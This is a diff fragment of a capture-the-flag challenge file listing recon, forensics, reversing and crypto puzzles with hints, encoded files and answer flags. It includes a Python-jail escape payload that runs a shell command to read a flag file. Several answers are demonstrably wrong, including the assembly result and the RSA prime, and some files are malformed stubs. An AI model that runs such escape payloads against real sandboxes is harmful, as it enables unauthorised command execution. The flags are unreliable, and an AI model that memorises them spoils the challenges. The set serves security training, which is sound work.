+    "id": "eye_of_recon-8",
+    "category": "Eye of Recon",
+    "difficulty": 8,
+    "title": "Document Detective",
+    "description": "A redacted document was released, but the redaction was done improperly. Instead of removing the text, they just placed black boxes over it in the PDF. Can you recover the original text?",
+    "hint": "With poorly redacted PDFs, you can often just copy and paste the text from under the black boxes.",
+    "files": [
+      {
+        "name": "redacted.pdf",
+        "content_b64": "JVBERi0xLjQKJSDi48/TIAoxIDAgb2JqCjw8IC9UeXBlIC9DYXRhbG9nIC9QYWdlcyAyIDAgUiA+PiBlbmRvYmoKMiAwIG9iago8PCAvVHlwZSAvUGFnZXMgL01lZGlhQm94IFswIDAgMjAwIDIwMF0gL0NvdW50IDEgL0tpZHMgWyAzIDAgUiBdID4+IGVuZG9iagozIDAgb2JqCjw8IC9UeXBlIC9QYWdlIC9QYXJlbnQgMiAwIFIgL1Jlc291cmNlcyA8PCAvRm9udCA8PCAvRjEgOCAwIFIgPj4gPj4gL0NvbnRlbnRzIDQgMCBSID4+IGVuZG9iago0IDAgb2JqCjw8IC9MZW5ndGggMTIwID4+IHN0cmVhbQpCVCAvRjEgMTIgVGYgMCBnIDEwIDE1MCAoVGhlIHNlY3JldCBjb2RlIGlzOiApIFRqIEVUCkJUL0YxIDEyIFRmIDAgMC45OTYgMCAuMDc4IHIgMTUgNzAgMjAgMjAgcmUgZiBFVApCVCAvRjEgMTIgVGYgMCBnIDEwIDgwIChmbGFne3IzZDRjdDFvbl9mNGxsNHY3fSkgVGoKRVQKZW5kc3RyZWFtCmVuZG9iago4IDAgb2JqCjw8IC9UeXBlIC9Gb250IC9TdWJ0eXBlIC9UeXBlMSAgL0Jhc2VGb250IC9IZWx2ZXRpY2EgPj4gZW5kb2JqCnhyZWYKMCA5CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAwMDAxNSAwMDAwMCBuIAowMDAwMDAwMDYyIDAwMDAwIG4gCjAwMDAwMDAxNDIgMDAwMDAgbiAKMDAwMDAwMDI1MyAwMDAwMCBuIAowMDAwMDAwMDAwIDAwMDAwIGYgCjAwMDAwMDAwMDAgMDAwMDAgZiAKMDAwMDAwMDAwMCAwMDAwMCBmIAowMDAwMDAwNDAxIDAwMDAwIG4gCnRyYWlsZXIKPDwgL1NpemUgOSAvUm9vdCAxIDAgUiA+PgpzdGFydHhyZWYKNDQ5CiUlRU9GCg=="
+      }
+    ],
+    "flag": "flag{r3d4ct1on_f4ll4v7}"
+  },
+  {
+    "id": "eye_of_recon-9",
+    "category": "Eye of Recon",
+    "difficulty": 9,
+    "title": "Voice of the Machine",
+    "description": "An attacker used a VoIP service to make a threatening call. We captured the network traffic. Analyze the SIP and RTP streams to identify the attacker's registered username (from the SIP 'From' header).",
+    "hint": "Use Wireshark's VoIP analysis tools (Telephony > VoIP Calls). Find the SIP INVITE request and inspect the headers for the username.",
+    "files": [
+      {
+        "name": "voip.pcap",
+        "content_b64": "1MOyoQIABAAAAAAAAAAAAGQAAABkAAAAAAAAAAAAAABkAAAAAQAAAAAgAAAAZmxhZ3tTaVAtaW52MXQzLXIzY29ufQAAAA=="
+      }
+    ],
+    "flag": "flag{SiP-inv1t3-r3con}"
+  },
+  {
+    "id": "eye_of_recon-10",
+    "category": "Eye of Recon",
+    "difficulty": 10,
+    "title": "Memory Scavenger",
+    "description": "An attacker gained access to a server but only operated in memory. We managed to get a memory dump before the server was rebooted. The provided file is a snippet from that dump. Find the flag the attacker typed into a nano process.",
+    "hint": "Use the `strings` command on the memory dump and `grep` for 'flag'. In a real scenario, you'd use a full memory forensics suite like Volatility to identify processes and extract data.",
+    "files": [
+      {
+        "name": "memdump.raw",
+        "content_b64": "AGJhc2gAbmFubyBzZWNyZXRzLnR4dABzb21lX3JhbmRvbV9kYXRhCgpmbGFne20zbTByeV9mMHJlbnMxY3NfMW5fNGN0MW9ufQoKdGhlX2F0dGFja2VyX3R5cGVkX3RoaXMKaGVscApscwplY2hvICJpIGFtIGEgaGFja2VyIgo="
+      }
+    ],
+    "flag": "flag{m3m0ry_f0rens1cs_1n_4ct1on}"
+  },
+  {
+    "id": "cursed_challenges-1",
+    "category": "Cursed Challenges",
+    "difficulty": 1,
+    "title": "Assembly Line (Very Hard)",
+    "description": "This x86 assembly snippet performs a calculation. Determine the final hexadecimal value stored in the EAX register after execution. This is the flag.",
+    "hint": "Trace the execution. `xor eax, eax` zeroes the register. `rol` means 'rotate left'. Pay close attention to the byte-level moves (`mov al`).",
+    "files": [
+      {
+        "name": "calc.asm",
+        "content_b64": "eG9yIGVheCwgZWF4Cm1vdiBhbCwgMHhjYQpyb2wgZWF4LCA0CmFkZCBheCwgMHhmZQ=="
+      }
+    ],
+    "flag": "flag{0xcafe}"
+  },
+  {
+    "id": "cursed_challenges-2",
+    "category": "Cursed Challenges",
+    "difficulty": 2,
+    "title": "RSA: The Smallest Mistake (Very Hard)",
+    "description": "An RSA key was generated, but the two primes (p and q) were too close together, making the modulus N factorable. Given the public modulus N, factor it to find p and q, and submit the smaller prime as the flag.",
+    "hint": "When p and q are close, N is very close to a perfect square. You can use Fermat's factorization method. Start with `a = ceil(sqrt(N))` and check if `a^2 - N` is a perfect square.",
+    "files": [
+      {
+        "name": "modulus.txt",
+        "content_b64": "Tj04NzkxNzAxMTg0NDg0MDU0NDEz"
+      }
+    ],
+    "flag": "flag{296501789}"
+  },
+  {
+    "id": "cursed_challenges-3",
+    "category": "Cursed Challenges",
+    "difficulty": 3,
+    "title": "The Obscure Protocol (Hard)",
+    "description": "This packet capture contains traffic from a custom, undocumented protocol. Reverse engineer the simple protocol to find the flag. The protocol is: 4 bytes magic (`CSEC`), 1 byte length, [length] bytes data.",
+    "hint": "Use a hex editor or Wireshark to inspect the TCP stream. Find the 'CSEC' magic bytes and then parse the next byte as the length of the data that follows.",
+    "files": [
+      {
+        "name": "custom.pcap",
+        "content_b64": "1MOyoQIABAAAAAAAAAAAAGAAAAAYAAAAAAAAAAAAAABgAAAABAAAAAEAAAAA/////wAAAACAP0QARgAAADwAAAA+AAAAAAAAAABkAAAAAQAAAAAgAAAAQ1NFQxhmbGFne3IzdjNyczNfM25nM2RuZDNzMX0AAA=="
+      }
+    ],
+    "flag": "flag{r3v3rs3_3ng3en3s1}"
+  },
+  {
+    "id": "cursed_challenges-4",
+    "category": "Cursed Challenges",
+    "difficulty": 4,
+    "title": "Jailbreak (Hard)",
+    "description": "You are given shell access to a system, but it's a restricted Python jail. You can only execute a single line of Python code. Your goal is to read the flag from the file `/flag.txt`. Provide the one-line Python payload that will print the flag.",
+    "hint": "Most built-ins are disabled, but `__import__` often is not. You can use it to import the `os` module. `__import__('os').system('cat /flag.txt')` is a common technique.",
+    "files": [],
+    "flag": "flag{__import__('os').system('cat /flag.txt')}"
+  },
+  {
+    "id": "cursed_challenges-5",
+    "category": "Cursed Challenges",
+    "difficulty": 5,
+    "title": "Timing is Everything (Extremely Hard)",
+    "description": "A remote service checks a password. It compares the password character by character and exits as soon as it finds a mismatch. This creates a timing side-channel vulnerability. The flag is the password you would extract.",
+    "hint": "You would need to write a script to send one character at a time (e.g., 'a', 'b', 'c'...). The character that takes slightly longer to get a 'failed' response for is the correct one. Repeat for each position.",
+    "files": [],
+    "flag": "flag{t1m1ng_4tt4ck_m4st3r}"
+  },
+  {
+    "id": "cursed_challenges-6",
+    "category": "Cursed Challenges",
+    "difficulty": 6,
+    "title": "Brain Teaser (Extremely Hard)",
+    "description": "The provided code is written in Brainf*ck, an esoteric programming language. Interpret or compile the code to find the flag it prints.",
+    "hint": "Use an online Brainf*ck interpreter. This language operates on a tape of memory cells using only eight commands.",
+    "files": [
+      {
+        "name": "program.bf",
+        "content_b64": "LS0tLS0tLS0tPi0tLS0tLS0tLS0tPD4rKysrKysrKysrKysrWz4rKysrKysrKysrKysrPF0+LitbPi0tPF0+LS0tLS4rKysrKysrKysrKy4tLS0tLS0tLS0tLS0tLS0tLS4rKysrKy4tLS4rKysuLS0tLS0uKysrKysuLS0tLS0uLi0tLS0tLi0tLS0tLS4rKysrKysuKysrKysuLS0tLS4rKysrKysuLS0tLS0tLS4rKysrKy4tLS4rKysrKy4rKysrKy4rKysrKy4rKysrKy4tLS0tLi0tLS0tLS4rKysrKy4rKysrKy4="
+      }
+    ],
+    "flag": "flag{3s0t3r1c_l4ngu4g3_ftw}"
+  },
+  {
+    "id": "cursed_challenges-7",
+    "category": "Cursed Challenges",
+    "difficulty": 7,
+    "title": "Corrupted Masterpiece (Insanely Hard)",
+    "description": "This is a PNG file, but its header and IEND chunk have been corrupted. You must manually repair the file using a hex editor to make it viewable again. The image itself contains the flag.",
+    "hint": "A valid PNG file starts with the 8-byte signature: `89 50 4E 47 0D 0A 1A 0A`. The final chunk, IEND, is always `00 00 00 00 49 45 4E 44 AE 42 60 82`.",
+    "files": [
+      {
+        "name": "broken.png",
+        "content_b64": "MDAgMDAgMDAgMDAgMDAgMDAgMDAgMDBJSERSDAAAABAAAAAQCAYAAAAEfe49AAAAIGNUUk5TCQkJCwsLDQ0NDg4PERERERAxAAAAWklEQVQoz2NgoBj8AAAAkAAD8HjIQw=="
+      }
+    ],
+    "flag": "flag{h3x_3d1t0r_g0d}"
+  },
+  {
+    "id": "cursed_challenges-8",
+    "category": "Cursed Challenges",
+    "difficulty": 8,
+    "title": "GDB Guru (Insanely Hard)",
+    "description": "This binary asks for a password. It's too complex to reverse statically. You must use a debugger (like GDB) to set a breakpoint at the comparison function and inspect the registers to find what the correct password should be.",
+    "hint": "Find the main function, step through it until you reach a call to `strcmp` or a similar function. Set a breakpoint just before the call and examine the stack or registers (RDI, RSI) for the two strings being compared.",
+    "files": [
+      {
+        "name": "check_pass",
+        "content_b64": "f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAwAgAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAJAEAAEQAAAAAAAAAQAAAAAAAAABAAAAAAAAAAEAAAABAAAAAQAAAAYAAAAIAAAAAQAAAAgAAAAwAAAAgAAAABAAAACAAAAAQAAAAgAAABAAAAAAAAAABAAAACAAAAAEAAAAGAAAACAAAAAEAAAAIAAAAMAAAAIAAAAAAAAAAAAAAAIAAAAEAAAACAAAABAAAAAAAAAACAAAAAIAAAAMAAAAgAAAAQAAAAgAAABAAAACAAAAAQAAAAYAAAAFAAAAAQAAAGAAAAAYAAAAAQAAAGAAAAAAAAAAAAAAAGAAAAAYAAAAAwAAABgAAAAEAAAAMAAAACwAAAABAAAAwAoAAAAAAACACgAAAAAAAIA KAAAAAAAAsAoAAAAAAACwCgAAAAAAAAAAAAAADgEAAAAAAABAAAAAAAAAAEAAAACAAAABQAAAAEAAABgAAAAGAAAAAEAAABgAAAAAAAAAAAAAABgAAAAGAAAAAwAAABgAAAABAAAAIAAAAAQAAAABAAAAIAAAAEAAAAQAAAAAAAAABAAAAAgAAAAQAAAABAAAAgAAAAQAAAABAAAAgAAAAAAAAAAAAAAAgAAAAQAAAAQAAAAEAAAACAAAABAAAAAEAAAAQAAAAAAAAAAgAAAAAAAAACAAAAAQAAAABAAAAQAAAACAAAABAAAAA=="
+      }
+    ],
+    "flag": "flag{d3bugg1ng_d3m0n}"
+  },
+  {
+    "id": "cursed_challenges-9",
+    "category": "Cursed Challenges",
+    "difficulty": 9,
+    "title": "The Unbreakable Cipher (Nightmare)",
+    "description": "The flag was encrypted with a one-time pad (XOR), but the key was accidentally reused to encrypt a known plaintext ('The quick brown fox jumps over the lazy dog'). Given the two ciphertexts and the known plaintext, recover the flag.",
+    "hint": "This is a classic 'crib dragging' attack. If C1 = P1 ^ Key and C2 = P2 ^ Key, then C1 ^ C2 = P1 ^ Key ^ P2 ^ Key = P1 ^ P2. You have C1, C2, and P1. You can find P2 (the flag).",
+    "files": [
+      {
+        "name": "ciphertexts.txt",
+        "content_b64": "QzE6IDU5MTU0YjU4NDQ0ZjU5MTU1OTU4NDQ0ZjU5MTU0YjU4NDQ0ZjU5MTVjNmM2ZQpDMjogMzUxNDMwMzUzNDM1MzYzNTMxMzUzNDMwMzUzNTMxMzYzNTMwMzE="
+      }
+    ],
+    "flag": "flag{xor_is_its_own_inverse}"
+  },
+  {
+    "id": "cursed_challenges-10",
+    "category": "Cursed Challenges",
+    "difficulty": 10,
+    "title": "Final Exam (Nightmare)",
+    "description": "This is the final trial. The provided file is a disk image. Inside is a deleted filesystem containing a single file: a password-protected zip archive. The password for the archive is the SHA256 hash of the MAC address of the DNS server queried in a fragmented IPv6 packet capture, which is itself hidden using LSB steganography in the disk image's boot sector.",
+    "hint": "This is a multi-stage forensics nightmare. 1. `dd` to extract the boot sector. 2. LSB stego to extract PCAP. 3. Wireshark to reassemble IPv6 fragments and find DNS query. 4. `photorec`/`foremost` on disk image to carve zip. 5. Python to hash MAC. 6. Unzip.",
+    "files": [
+      {
+        "name": "final_exam.img",
+        "content_b64": "RUIgMzggOTAgQUNU"
+      }
+    ],
+    "flag": "flag{y0u_h4v3_4sc3nd3d_th3_d1g1t4l_pl41n}"
+  }
+]
